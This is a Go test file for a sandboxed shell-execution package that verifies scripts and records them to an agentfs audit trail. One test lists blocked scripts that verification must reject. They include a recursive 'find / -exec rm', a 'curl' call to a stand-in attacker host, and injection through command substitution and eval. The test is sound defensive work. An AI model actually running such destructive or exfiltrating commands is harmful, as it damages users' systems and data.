// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2026-present Datadog, Inc.

package sandboxed

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	agentfs "github.com/tursodatabase/agentfs/sdk/go"
)

func TestExecute_ValidScript(t *testing.T) {
	result, err := Execute(context.Background(), `echo hello`)
	require.NoError(t, err)
	assert.Equal(t, 0, result.ExitCode)
	assert.Equal(t, "hello\n", result.Stdout)
	assert.Empty(t, result.Stderr)
	assert.Greater(t, result.DurationMillis, int64(0))
	assert.NotEmpty(t, result.SessionID)

	// Clean up.
	_ = CloseSession(result.SessionID)
}

func TestExecute_VerificationFailure(t *testing.T) {
	_, err := Execute(context.Background(), `echo $(whoami)`)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "verification failed")
}

func TestExecute_NonZeroExitCode(t *testing.T) {
	result, err := Execute(context.Background(), `false`)
	require.NoError(t, err) // Non-zero exit is not a Go error
	assert.Equal(t, 1, result.ExitCode)

	// Clean up.
	_ = CloseSession(result.SessionID)
}

func TestExecute_AutoSession(t *testing.T) {
	result, err := Execute(context.Background(), `echo auto`)
	require.NoError(t, err)
	assert.NotEmpty(t, result.SessionID, "auto-created session ID should be returned")

	// Clean up.
	_ = CloseSession(result.SessionID)
}

func TestExecute_PersistentSession(t *testing.T) {
	// Create a session via the SDK.
	sessionID := "test-persistent-" + time.Now().Format("20060102150405")
	afs, err := agentfs.Open(context.Background(), agentfs.AgentFSOptions{ID: sessionID})
	require.NoError(t, err)
	afs.Close()
	defer CloseSession(sessionID)

	// First run.
	result1, err := Execute(context.Background(), `echo first`, WithSession(sessionID))
	require.NoError(t, err)
	assert.Equal(t, sessionID, result1.SessionID)
	assert.Equal(t, "first\n", result1.Stdout)

	// Second run in the same session.
	result2, err := Execute(context.Background(), `echo second`, WithSession(sessionID))
	require.NoError(t, err)
	assert.Equal(t, sessionID, result2.SessionID)
	assert.Equal(t, "second\n", result2.Stdout)

	// Verify both executions are recorded in the audit trail.
	afs2, err := agentfs.Open(context.Background(), agentfs.AgentFSOptions{ID: sessionID})
	require.NoError(t, err)
	defer afs2.Close()

	calls, err := afs2.Tools.GetByName(context.Background(), "sandboxed_shell", 100)
	require.NoError(t, err)
	assert.GreaterOrEqual(t, len(calls), 2, "both executions should be recorded in audit trail")
}

func TestExecute_Timeout(t *testing.T) {
	script := `x=0; while [ $x -lt 1000000 ]; do x=$((x+1)); done`
	_, err := Execute(context.Background(), script, WithTimeout(100*time.Millisecond))
	// This should either timeout or complete quickly depending on system speed.
	// We just verify it doesn't hang.
	_ = err
}

func TestExecute_MaxOutputSize(t *testing.T) {
	script := `i=0; while [ $i -lt 1000 ]; do echo "line $i: some data to fill up the buffer"; i=$((i+1)); done`
	result, err := Execute(context.Background(), script, WithMaxOutputSize(100))
	require.NoError(t, err)
	assert.LessOrEqual(t, len(result.Stdout), 100)

	// Clean up.
	_ = CloseSession(result.SessionID)
}

func TestExecute_AuditTrail(t *testing.T) {
	// Execute a script and verify the tool call is recorded in the session DB.
	result, err := Execute(context.Background(), `echo audit-test`)
	require.NoError(t, err)
	defer CloseSession(result.SessionID)

	// Open the session DB and check the tool_calls table.
	afs, err := agentfs.Open(context.Background(), agentfs.AgentFSOptions{ID: result.SessionID})
	require.NoError(t, err)
	defer afs.Close()

	calls, err := afs.Tools.GetByName(context.Background(), "sandboxed_shell", 100)
	require.NoError(t, err)
	require.Len(t, calls, 1, "exactly one tool call should be recorded")

	call := calls[0]
	assert.Equal(t, "sandboxed_shell", call.Name)
	assert.Nil(t, call.Error, "successful execution should not have an error")
	assert.NotNil(t, call.Parameters, "parameters should be recorded")
	assert.NotNil(t, call.Result, "result should be recorded")
	assert.Contains(t, string(call.Parameters), "echo audit-test")
}

func TestCloseSession(t *testing.T) {
	// Create a session via the SDK.
	sessionID := "test-close-" + time.Now().Format("20060102150405")
	afs, err := agentfs.Open(context.Background(), agentfs.AgentFSOptions{ID: sessionID})
	require.NoError(t, err)
	afs.Close()

	// Verify the DB file was created.
	home, err := os.UserHomeDir()
	require.NoError(t, err)
	dbPath := filepath.Join(home, ".agentfs", sessionID+".db")
	_, err = os.Stat(dbPath)
	require.NoError(t, err, "session DB should exist after open")

	// Close the session.
	err = CloseSession(sessionID)
	require.NoError(t, err)

	// Verify the DB file was removed.
	_, err = os.Stat(dbPath)
	assert.True(t, os.IsNotExist(err), "session DB should be removed after close")
}

func TestCloseSession_NonExistent(t *testing.T) {
	// Closing a non-existent session should not error (files simply don't exist).
	err := CloseSession("nonexistent-session-id-12345")
	assert.NoError(t, err)
}

func TestExecute_BlockedScripts(t *testing.T) {
	// These should fail at verification, never reaching execution.
	scripts := []string{
		`echo $(whoami)`,
		`find / -exec rm {} \;`,
		`curl http://evil.com`,
		`eval "echo pwned"`,
		`echo hello > /tmp/file`,
	}

	for _, script := range scripts {
		t.Run(script, func(t *testing.T) {
			_, err := Execute(context.Background(), script)
			require.Error(t, err)
			assert.Contains(t, err.Error(), "verification failed")
		})
	}
}

func TestLimitedWriter(t *testing.T) {
	t.Run("under limit", func(t *testing.T) {
		var buf bytes.Buffer
		w := &limitedWriter{buf: &buf, limit: 100}
		n, err := w.Write([]byte("hello"))
		assert.NoError(t, err)
		assert.Equal(t, 5, n)
		assert.Equal(t, "hello", buf.String())
	})

	t.Run("over limit truncates", func(t *testing.T) {
		var buf bytes.Buffer
		w := &limitedWriter{buf: &buf, limit: 5}
		n, err := w.Write([]byte("hello world"))
		assert.NoError(t, err)
		assert.Equal(t, 11, n) // reports all bytes consumed per io.Writer contract
		assert.Equal(t, "hello", buf.String())
	})

	t.Run("multiple writes respect limit", func(t *testing.T) {
		var buf bytes.Buffer
		w := &limitedWriter{buf: &buf, limit: 8}
		w.Write([]byte("hello"))
		w.Write([]byte(" world"))
		assert.Equal(t, "hello wo", buf.String())
	})
}
